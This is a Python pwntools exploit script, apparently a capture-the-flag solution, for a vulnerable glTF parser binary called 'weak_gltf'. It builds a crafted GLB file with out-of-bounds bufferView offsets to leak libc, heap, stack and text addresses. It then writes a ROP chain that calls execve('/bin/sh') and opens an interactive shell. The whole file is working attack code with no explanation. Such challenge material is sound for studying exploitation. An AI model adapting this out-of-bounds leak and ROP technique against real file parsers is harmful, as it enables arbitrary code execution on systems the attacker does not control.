#!/usr/bin/env python3
from pwn import *
import json

context.arch = 'amd64'

binshstr = 0x1d8698
pop_rax_rdx_rbx = 0x90528
pop_rsi = 0x2be51
pop_rdi = 0x2a3e5
syscall = 0x29db4

def round_up(n, to):
    return (n + to - 1) & ~(to - 1)

generator = pwnlib.util.cyclic.cyclic_gen()

roplen = 8 * 10

bytedatalen = round_up(1016, 4)
bytedata = generator.get(bytedatalen)

jsondata = json.dumps(
{
"asset": {
"version": "2.0"
},
"scene": 0,
"buffers": [
{
"byteLength": bytedatalen
}
],
"bufferViews": [
{
"buffer": 0,
"byteLength": roplen,
"byteOffset": 0
},
{
"buffer": 0,
"byteLength": 4,
"byteOffset": 4
},
{
"buffer": 0,
"byteLength": 72,
"byteOffset": 8,
"target": 34963
},
{
"buffer": 0,
"byteLength": 288,
"byteOffset": 80,
"target": 34962
},
{
"buffer": 0,
"byteLength": 288,
"byteOffset": 368,
"target": 34962
},
{
"buffer": 0,
"byteLength": 192,
"byteOffset": 656,
"target": 34962
},
{
"buffer": 0,
"byteLength": 24,
"name": "LeakLibc",
# "byteOffset": 848
"byteOffset": 7008
},
{
"buffer": 0,
"byteLength": 144,
"name": "LeakTextHeapStack",
# "byteOffset": 872
"byteOffset": 10760
}
],
"scenes": [
{
"name": "Root Scene",
"nodes": [
0
]
}
],
"accessors": [
{
"componentType": 5126,
"type": "SCALAR",
"count": 1,
"bufferView": 0,
"byteOffset": 0,
"min": [
0.0
],
"max": [
0.0
]
},
{
"componentType": 5126,
"type": "SCALAR",
"count": 1,
"bufferView": 1,
"byteOffset": 0
},
{
"componentType": 5123,
"type": "SCALAR",
"count": 36,
"bufferView": 2,
"byteOffset": 0
},
{
"componentType": 5126,
"type": "VEC3",
"count": 24,
"bufferView": 3,
"byteOffset": 0,
"min": [
-0.004999999888241291,
-0.004999999888241291,
-0.004999999888241291
],
"max": [
0.004999999888241291,
0.004999999888241291,
0.004999999888241291
]
},
{
"componentType": 5126,
"type": "VEC3",
"count": 24,
"bufferView": 4,
"byteOffset": 0
},
{
"componentType": 5126,
"type": "VEC2",
"count": 24,
"bufferView": 5,
"byteOffset": 0
},
{
"componentType": 5126,
"type": "VEC3",
"count": 24,
"min": [
0.0,
0.0,
0.0
],
"max": [
0.014999999664723873,
0.0,
0.0
],
"sparse": {
"count": 12,
"indices": {
"bufferView": 6,
"byteOffset": 0,
"componentType": 5123
},
"values": {
"bufferView": 7,
"byteOffset": 0
}
},
"name": "blendShape1.pCube2"
}
],
"samplers": [
{}
],
"materials": [
{
"name": "lambert2",
"doubleSided": False,
"alphaMode": "OPAQUE",
"extras": {
"blendAlphaCutoff": 0.55,
"fromFBX": {
"shadingModel": "Lambert",
"isTruePBR": False
}
},
"pbrMetallicRoughness": {
"baseColorFactor": [
0.4000000059604645,
0.4000000059604645,
0.4000000059604645,
1.0
],
"metallicFactor": 0.20000000298023224,
"roughnessFactor": 0.800000011920929
}
}
],
"meshes": [
{
"name": "pCube1",
"primitives": [
{
"material": 0,
"mode": 4,
"attributes": {
"NORMAL": 4,
"POSITION": 3,
"TEXCOORD_0": 5
},
"indices": 2,
"targets": [
{
"POSITION": 6
}
]
}
],
"weights": [
0.0
],
"extras": {
"targetNames": [
"blendShape1.pCube2"
]
}
}
],
"animations": [
{
"name": "Take 001",
"channels": [
{
"sampler": 0,
"target": {
"node": 1,
"path": "weights"
}
}
],
"samplers": [
{
"input": 0,
"interpolation": "LINEAR",
"output": 1
}
]
}
],
"nodes": [
{
"name": "RootNode",
"translation": [
0.0,
0.0,
0.0
],
"rotation": [
0.0,
0.0,
0.0,
1.0
],
"scale": [
1.0,
1.0,
1.0
],
"children": [
1
]
},
{
"name": "pCube1",
"translation": [
0.0,
0.0,
0.0
],
"rotation": [
0.0,
0.0,
0.0,
1.0
],
"scale": [
1.0,
1.0,
1.0
],
"mesh": 0
}
]
}
)

# origin offset 0x350 (848)
# 0x1810 + 0x350 --> 7008

# origin offset 0x368 (872)
# 0x26a0 + 0x368 --> 10760

chunk0_length = round_up(len(jsondata), 4)
chunk0_format = 0x4E4F534A
chunk1_length = bytedatalen
chunk1_format = 0x004e4942

version       = 0
length        = 20 + chunk0_length + 8 + chunk1_length

glb  = b'glTF'
glb += p32(version)
glb += p32(length)
glb += p32(chunk0_length) # JSON data length
glb += p32(chunk0_format)

glb += jsondata.encode().ljust(chunk0_length, b' ')

glb += p32(chunk1_length)
glb += p32(chunk1_format)

glb += bytedata

p = process('bin/weak_gltf', env={"LD_PRELOAD": "lib/libc.so.6"})

p.sendlineafter(b'Length of GLB file: ', str(len(glb)).encode())
p.sendafter(b'Data of GLB file: ', glb)

p.recvuntil(b'LeakLibc')
p.recvuntil(b'buffer data  : \n      ')
libc = int(b''.join(p.recvuntil(b'00').split(b' ')[::-1][1:]), 16) - 0x219ce0

log.info('libc: ' + hex(libc))

p.recvuntil(b'LeakTextHeapStack')
p.recvuntil(b'buffer data  : \n      ')
data = p.recvuntil(b'target').replace(b'\n      ', b'').split(b' ')[:-5]

rbp = int(b''.join(data[0:8][::-1]), 16) + 0xe40
text = int(b''.join(data[8:0x10][::-1]), 16) - 0x5946b
heap = int(b''.join(data[0x20:0x28][::-1]), 16) - 0x1aab0

# print(data)
log.info('rbp: ' + hex(rbp))
log.info('text: ' + hex(text))
log.info('heap: ' + hex(heap))

offset = -0x19be0 + rbp - heap

p.sendlineafter(b'Bufferview index:', b'0')
p.sendlineafter(b'Bufferview offset:', str(offset).encode())
payload  = p64(0) # rbp
payload += flat(
    libc + pop_rax_rdx_rbx,
    59,
    0,
    0,
    libc + pop_rdi,
    libc + binshstr,
    libc + pop_rsi,
    0,
    libc + syscall,
).ljust(roplen, b'\0')
# raw_input('>')
p.sendlineafter(b'Buffer data:', payload)

p.interactive()